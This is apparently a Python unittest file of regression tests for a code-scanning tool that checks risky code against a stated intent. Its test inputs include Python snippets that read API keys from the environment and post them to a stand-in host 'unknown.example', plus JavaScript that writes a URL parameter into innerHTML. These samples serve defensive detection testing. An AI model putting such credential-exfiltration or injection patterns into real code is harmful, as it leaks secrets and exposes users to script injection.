import unittest
from main import analyze_code_product

class LaunchRegressions(unittest.TestCase):
    def scan(self, code, language='Python', intent='Review source behavior.'):
        r=analyze_code_product(intent,code,language=language)
        self.assertTrue(all(e['status']=='complete' for e in r['analysis_engines']),r['analysis_engines'])
        return r
    def test_fetch_formatting_and_trailing_code_do_not_change_risk(self):
        for code in ['async function status() { const r = await fetch("https://example.com/status"); return r.json(); }', 'async function status() {\nconst r = await fetch("https://example.com/status");\nreturn r.json();\n}']:
            r=self.scan(code,'JavaScript','Fetch public JSON over HTTPS.')
            self.assertFalse(r['flags']);self.assertFalse(r['engine_findings'])
    def test_url_html_injection_and_plain_text_pair(self):
        for sink,expected in [('innerHTML',True),('outerHTML',True),('textContent',False)]:
            r=self.scan('const name = new URLSearchParams(location.search).get("name");\ndocument.getElementById("name").'+sink+' = name;', 'JavaScript','Display a user name.')
            self.assertEqual(any(f.get('rule_id')=='javascript.url-to-html' for f in r['engine_findings']),expected)
        r=self.scan('document.getElementById("name").innerHTML = "<b>Hello</b>";', 'JavaScript','Display fixed markup.')
        self.assertFalse(r['engine_findings'])
    def test_credential_aliases_and_reassignment(self):
        for imp,call in [('import requests as r','r.post'),('from requests import post as transmit','transmit'),('import httpx as h','h.post')]:
            prefix='import os\n'+imp+'\nsecret=os.environ.get("OPENAI_API_KEY")\n'
            r=self.scan(prefix+call+'("https://unknown.example/log",json={"key":secret})')
            self.assertTrue(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']))
            r=self.scan(prefix+'secret="public"\n'+call+'("https://unknown.example/log",json={"key":secret})')
            self.assertFalse(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']))
    def test_authentication_intent_does_not_authorize_arbitrary_destinations_or_payload(self):
        prefix='import os, requests\nkey=os.getenv("OPENAI_API_KEY")\n'
        for host,kw,expected in [('api.openai.com','headers',False),('unknown.example','headers',True),('api.openai.com','json',True)]:
            r=self.scan(prefix+f'requests.post("https://{host}/v1",{kw}={{"Authorization":key}})',intent='Authenticate to OpenAI with an environment credential.')
            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
    def test_prohibition_and_environment_wording(self):
        r=self.scan('import os, requests\nkey=os.getenv("API_KEY")\nrequests.post("https://unknown.example",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
        self.assertTrue(any('conflicts with' in s for s in r['intent_mismatches']))
        self.assertFalse(any('contain secrets' in s for s in r['intent_mismatches']))
